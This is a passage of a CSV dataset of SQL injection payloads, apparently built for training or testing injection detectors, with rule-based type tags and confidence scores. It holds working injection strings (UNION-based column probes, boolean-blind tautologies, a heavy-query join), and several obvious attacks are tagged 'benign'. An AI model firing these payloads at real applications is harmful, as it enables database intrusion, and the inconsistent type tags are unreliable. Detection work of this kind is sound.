row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2430,1 ) where 8375 = 8375,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2431,1' in boolean mode ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2432,1' order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2433,select case when 3920 = 4402 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2434,1' ) ) ) and 5615 = 5458--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2435,"-8810' ) or make_set ( 9354 = 9354,7185 ) and ( 'prsn' like 'prsn",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
2436,"-5706"" ) ) union all select 2013,2013,2013,2013#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2437,1' ) where 9159 = 9159,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2438,"-7860' ) ) ) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2439,"-3546%"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2440,1' ) where 2928 = 2928,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2441,"1"" ) ) as ajwe where 1153 = 1153 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
2442,"1%' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2443,-9668' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,,boolean_blind,generic,0.95,5822 = 5822 or detected — boolean_blind injection (priority 8) on generic,rule-based
